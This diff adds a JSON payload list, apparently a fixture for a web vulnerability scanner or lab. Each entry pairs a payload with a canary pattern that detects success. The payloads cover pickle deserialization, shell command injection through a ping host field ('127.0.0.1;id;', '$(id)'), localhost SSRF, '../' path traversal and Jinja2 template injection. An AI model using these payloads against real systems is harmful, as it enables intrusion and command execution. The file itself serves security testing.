@@ -1,0 +1,72 @@
+[
+  {
+    "id": "dyn_deser_1",
+    "endpoint": "/load",
+    "method": "POST",
+    "params": {
+      "data": "gASVJQAAAAAAAC1dq1KdcQBYCQAAAHNlY3JldHNxAWgAWAQAAABmbGFncQJYGQAAAENBTkFSWV9ERVNFUl85YTFmN2JxA3N9cQRi"
+    },
+    "detect_pattern": "CANARY_DESER_9a1f7b",
+    "technique": "pickle opcode manipulation with base64 encoding of crafted object"
+  },
+  {
+    "id": "dyn_deser_2",
+    "endpoint": "/load",
+    "method": "POST",
+    "params": {
+      "data": "gASVKAAAAAAAAACMCXBpY2tsZXRzcxBdcQBdcQFYGQAAAENBTkFSWV9ERVNFUl85YTFmN2JxAksuAXEDhXEEUnEFLg=="
+    },
+    "detect_pattern": "CANARY_DESER_9a1f7b",
+    "technique": "alternative pickle protocol with list construction"
+  },
+  {
+    "id": "dyn_cmd_2",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1;id;"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "semicolon command separator"
+  },
+  {
+    "id": "dyn_cmd_3",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1$(id)"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "command substitution with $(...)"
+  },
+  {
+    "id": "dyn_ssrf_2",
+    "endpoint": "/fetch",
+    "method": "GET",
+    "params": {
+      "url": "http://localhost:8080/healthz"
+    },
+    "detect_pattern": "CANARY_SSRF_3e7d2c",
+    "technique": "localhost alias instead of 127.0.0.1"
+  },
+  {
+    "id": "dyn_path_2",
+    "endpoint": "/read",
+    "method": "GET",
+    "params": {
+      "name": "../../tmp/path_canary.txt"
+    },
+    "detect_pattern": "CANARY_PATH_5c9e0a",
+    "technique": "relative path traversal with ../ sequences"
+  },
+  {
+    "id": "dyn_ssti_2",
+    "endpoint": "/render",
+    "method": "POST",
+    "params": {
+      "template": "{{config.__class__.__init__.__globals__['ssti_canary']}}"
+    },
+    "detect_pattern": "CANARY_SSTI_2b6d4e",
+    "technique": "Jinja2 attribute chain bypass via __class__ and __globals__"
+  }
+]
